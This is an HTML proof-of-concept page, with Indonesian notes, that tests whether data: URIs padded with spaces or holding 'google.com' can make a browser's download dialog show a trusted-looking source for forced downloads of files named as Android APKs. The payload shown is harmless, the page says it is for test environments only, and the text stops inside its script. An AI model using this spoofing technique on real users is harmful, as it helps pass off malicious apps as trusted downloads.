<body>
  <h2>PoC — data: variations (fixed)</h2>
  <p class="note">Uji hanya di lingkungan pengujian. Klik tombol lalu perhatikan teks pada dialog download.</p>

  <div class="section">
    <button onclick="dl('data: ,blank')">BUTTON 1 — data + Blank</button>
    <button onclick="dl('data:          google.com       ,blank')">BUTTON 1 — data + Google + Blank</button>
    <button onclick="dl('data:text/plain,source%3A%20https%3A%2F%2Fgoogle.com')">BUTTON 2 — data (URL-encoded contains https://google.com)</button>
    <button onclick="dl('data:text/plain,https://google.com,more')">BUTTON 3 — data:text/plain contains literal https://google.com</button>
  </div>

  <div class="section">
    <h3>Console / Info</h3>
    <pre id="log">Ready. Klik tombol untuk membuat download.</pre>
  </div>

<script>
function log(msg){
  const p = document.getElementById('log');
  p.textContent = msg;
}

/* Puf: create <a> anchor, set download & href, click, then remove */
function Puf(uri, name) {
  try {
    const link = document.createElement("a");
    link.download = name || '';
    link.href = uri;
    document.body.appendChild(link);
    link.click();
    setTimeout(()=> link.remove(), 50);
    log('Puf() triggered:\n  href: ' + uri + '\n  download: ' + name);
  } catch (e) {
    log('Puf() error: ' + e);
  }
}

/* Simple wrapper to create anchor and force download for non-Puf tests */
function doAnchor(href, name){
  const a = document.createElement('a');
  a.href = href;
  a.download = name || 'download';
  document.body.appendChild(a);
  a.click();
  setTimeout(()=> a.remove(), 50);
  log('Triggered download:\n  href: ' + href + '\n  download: ' + name);
}

/* Generic download wrapper used by Tombol 1-3 */
function dl(href){
  const name = 'test-file.apk';
  doAnchor(href, name);
}

/* Tombol 4: use Puf with a short base64 data:apk, no redirect */
function openWin(){
  const uri = "data:application/vnd.android.package-archive;base64,UGVhY2UgQmUgVXBvbiBZb3U=";
  const name = "Testing.apk";
  Puf(uri, name);
}
